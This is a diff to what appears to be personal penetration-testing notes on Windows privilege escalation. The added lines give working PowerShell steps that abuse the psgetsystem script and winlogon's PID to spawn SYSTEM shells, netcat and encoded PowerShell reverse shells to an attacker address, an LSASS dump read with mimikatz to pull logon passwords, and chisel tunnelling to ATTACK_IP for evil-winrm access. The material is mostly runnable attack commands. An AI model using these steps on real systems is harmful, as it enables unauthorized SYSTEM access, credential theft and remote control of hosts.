@@ -5,13 +5,69 @@ Using this technique, we can elevate our privileges to SYSTEM by launching a chi
 
 First, transfer this PoC script to target https://github.com/decoder-it/psgetsystem
 
-RCE as SYSTEM
+SYSTEM Priv Esc
 ```powershell
-# identify running processes and accompanying PIDs
-tasklist  # winlogon.exe is a good one as it runs as SYSTEM on windows hosts
+# List running processes with PIDs
+Get-Process
 
-# run script
-.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")
+# Key SYSTEM processes to target:
+System                           4 Services                   0        116 K
+winlogon.exe                   612 Console                    1     10,408 K
+lsass.exe                      680 Services                   0     15,332 K
+
+# Load PoC script (psgetsystem)
+. .\psgetsys.ps1    # Yes, there are 2 dots on purpose...
+# or...
+ipmo psgetsys.ps1; [MyProcess]::CreateProcessFromParent(612, "cmd.exe", "")
+
+# Syntax: [MyProcess]::CreateProcessFromParent(<system_pid>, <command>, "")
+
+# Target winlogon.exe (PID 612) to spawn SYSTEM cmd
+ipmo psgetsys.ps1; [MyProcess]::CreateProcessFromParent(612, "cmd.exe", "")
+
+# Reverse shell example
+ipmo psgetsys.ps1; [MyProcess]::CreateProcessFromParent(612, "C:\Users\alaading\Desktop\nc.exe", "10.10.14.255 7777 -e powershell")
+
+# Reverse shell example 2 (My preferred way)
+. .\psgetsys.ps1
+ImpersonateFromParentPid -ppid 612 -command "c:\windows\system32\cmd.exe" -cmdargs "/c powershell -e <BASE64 ENCODED PS REV SHELL HERE>"
+
+# New command prompt opens as SYSTEM
+C:\Windows\system32>whoami
+nt authority\system
+```
+
+Another way (sometimes shells are goofy remember that...)
+```powershell
+# Generate LSASS dump file
+.\procdump64.exe -accepteula -ma lsass.exe lsass.dmp
+
+# Dump file contents
+.\mimikatz.exe
+Sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords
+```
+
+Error 122? - ERROR_INSUFFICIENT_BUFFER
+```powershell
+# it means your shell is shit
+# Consider transferring over chisel, opening up 5895, and using evil-winrm for a better shell, then repeating the same steps above. You should get a reverse shell.
+
+# ATTACK
+./chisel server -p 8000 --reverse
+
+# VICTIM
+# Connect back to attack box and forward port 5985
+.\chisel.exe client ATTACK_IP:8000 R:5985:127.0.0.1:5985
+
+# Connect via evil-winrm
+evil-winrm -i 127.0.0.1 -u <Username> -p <Password>
+
+# Repeat steps in SYSTEM Priv Esc code block
+. .\psgetsys.ps1
+ImpersonateFromParentPid -ppid 612 -command "c:\windows\system32\cmd.exe" -cmdargs "/c powershell -e <BASE64 ENCODED PS REV SHELL HERE>"
+
+# catch shell as SYSTEM!!!
 ```
 
 ## SeManageVolumePrivilege
